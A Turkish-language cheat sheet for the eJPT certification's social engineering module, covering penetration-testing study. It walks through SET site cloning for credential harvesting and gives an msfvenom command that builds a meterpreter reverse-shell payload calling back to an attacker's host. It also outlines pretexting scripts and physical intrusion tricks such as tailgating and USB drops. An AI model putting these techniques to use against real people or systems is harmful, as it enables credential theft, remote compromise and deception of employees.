# Social Engineering & SET Toolkit Cheat Sheet

eJPT'nin ayrı bir modülü olan Social Engineering, insan faktörünü hedef alan saldırıları kapsar. Bu doküman SET (Social-Engineer Toolkit) kullanımını ve pretexting temellerini özetler — kendi hazırladığın `phishing-cheatsheet.md` ile birlikte kullanılmak üzere tasarlandı (o dosya *analiz* tarafını, bu dosya *saldırı/simülasyon* tarafını kapsıyor).

---

## İçindekiler

1. [Social Engineering Türleri (Hızlı Hatırlatma)](#1-social-engineering-türleri-hızlı-hatırlatma)
2. [SET (Social-Engineer Toolkit) Kurulum & Başlatma](#2-set-social-engineer-toolkit-kurulum--başlatma)
3. [SET ile Credential Harvester](#3-set-ile-credential-harvester)
4. [SET ile Payload/Listener Oluşturma](#4-set-ile-payloadlistener-oluşturma)
5. [Pretexting Çerçevesi](#5-pretexting-çerçevesi)
6. [OSINT → Pretext Bağlantısı](#6-osint--pretext-bağlantısı)
7. [Fiziksel Social Engineering](#7-fiziksel-social-engineering)
8. [Etik & Yasal Sınırlar](#8-etik--yasal-sınırlar)
9. [Hızlı Komut Referansı](#9-hızlı-komut-referansı)

---

## 1. Social Engineering Türleri (Hızlı Hatırlatma)

Detaylı tablo `phishing-cheatsheet.md` içinde mevcut — burada sadece saldırı planlaması açısından özetliyoruz:

| Vektör | Araç/Yöntem |
|---|---|
| Email phishing | SET, GoPhish |
| Kimlik avı sayfası (credential harvesting) | SET web attack modülü |
| Telefon (vishing) | Senaryo + hedef bilgisi (OSINT'ten) |
| Fiziksel (tailgating, USB drop) | Sahte badge, "unutulmuş" USB bellek |

---

## 2. SET (Social-Engineer Toolkit) Kurulum & Başlatma

```bash
# Kali/Parrot'ta genelde önceden yüklüdür
sudo setoolkit

# GitHub'dan kurulum (gerekirse)
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
python3 setup.py install
```

Ana menü:
```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
99) Exit
```

---

## 3. SET ile Credential Harvester

Bir login sayfasını (Gmail, Microsoft 365, şirket içi portal) klonlayıp girilen credential'ları yakalama.

```
setoolkit
> 1) Social-Engineering Attacks
> 2) Website Attack Vectors
> 3) Credential Harvester Attack Method
> 2) Site Cloner
> [Hedef sayfa URL'sini gir]
> [Kendi IP'ni listener adresi olarak gir]
```

SET otomatik olarak sayfayı klonlar, bir web sunucusu başlatır ve girilen kullanıcı adı/şifreyi terminalde + `harvester_*.txt` dosyasında gösterir.

> ⚠️ **Sadece yetkili engagement'larda ve izole test ortamlarında kullan.** Gerçek bir kullanıcının credential'ını izinsiz yakalamak yasa dışıdır.

---

## 4. SET ile Payload/Listener Oluşturma

```
setoolkit
> 1) Social-Engineering Attacks
> 4) Create a Payload and Listener
> [Payload tipi seç, örn. windows/meterpreter/reverse_tcp]
> [LHOST/LPORT gir]
```

SET, Metasploit'in `msfvenom` + `multi/handler` kombinasyonunu arka planda otomatikleştirir — üretilen payload'ı bir email eki veya USB senaryosu içinde teslim edecek şekilde kurgularsın.

---

## 5. Pretexting Çerçevesi

İyi bir pretext (senaryo) şu soruların cevabını içerir:

| Soru | Örnek |
|---|---|
| **Kimsin?** | "IT Destek Ekibi", "Yeni işe başlayan çalışan", "Tedarikçi firma" |
| **Neden iletişime geçtin?** | "Şifre sıfırlama süreci", "Fatura onayı", "Acil güvenlik güncellemesi" |
| **Neden şimdi/acil?** | "Hesabınız 24 saat içinde kilitlenecek" |
| **Ne istiyorsun?** | Tıklama, credential girişi, dosya açma, fiziksel erişim |
| **Güven nasıl kuruluyor?** | Gerçek isim/departman bilgisi (OSINT'ten), tanıdık marka görünümü |

---

## 6. OSINT → Pretext Bağlantısı

`osint-cheatsheet.md`'de topladığın veriler doğrudan burada kullanılır:

1. **LinkedIn'den** — hedefin yöneticisinin adı, departmanı, yakın zamanda katıldığı bir proje → "Yöneticiniz X'in onayıyla..." senaryosu.
2. **Email format tahmininden** — kurumsal görünümlü, gerçek bir çalışana benzeyen gönderen adresi.
3. **İş ilanlarından** — hedefin kullandığı yazılım/servis (örn. "Okta SSO") → o servisin sahte login sayfasını klonlama.
4. **Şirket haberlerinden** — güncel bir olay (birleşme, yeni ofis) → inandırıcı, zamana uygun pretext.

---

## 7. Fiziksel Social Engineering

| Teknik | Açıklama |
|---|---|
| **Tailgating** | Yetkili birinin arkasından, kartını kullanmadan güvenli alana girme |
| **USB Drop** | Otopark/lobi gibi alanlara "unutulmuş" USB bellek bırakıp merakla takılmasını bekleme |
| **Pretexting (yüz yüze)** | Sahte kimlik/üniforma ile (kurye, teknisyen) fiziksel erişim talep etme |
| **Shoulder surfing** | Ekran/klavye üzerinden şifre/hassas bilgi gözlemleme |

---

## 8. Etik & Yasal Sınırlar

- [ ] Her zaman **yazılı yetkilendirme (RoE)** ile hareket et — hangi vektörlerin (email, telefon, fiziksel) test kapsamında olduğu net yazılı olmalı.
- [ ] Yakalanan credential'ları **asla** gerçek sistemlere giriş için kullanma — sadece raporlama amaçlı.
- [ ] Hedef çalışanları küçük düşürücü/travmatik senaryolardan kaçın (örn. işten çıkarılma tehdidi).
- [ ] Fiziksel testte yanına her zaman **get-out-of-jail-free letter** (yetkilendirme belgesi) al.

---

## 9. Hızlı Komut Referansı

| İhtiyaç | Komut |
|---|---|
| SET'i başlat | `sudo setoolkit` |
| Credential harvester (site clone) | Menü: `1 → 2 → 3 → 2` |
| Payload + listener oluşturma | Menü: `1 → 4` |
| Manuel payload üretimi (SET dışı) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe` |

---

*eJPT social engineering modülü için referans olarak hazırlanmıştır. Tüm teknikler yalnızca yazılı yetkilendirme (scope/RoE) dahilinde ve izole test ortamlarında kullanılmalıdır.*
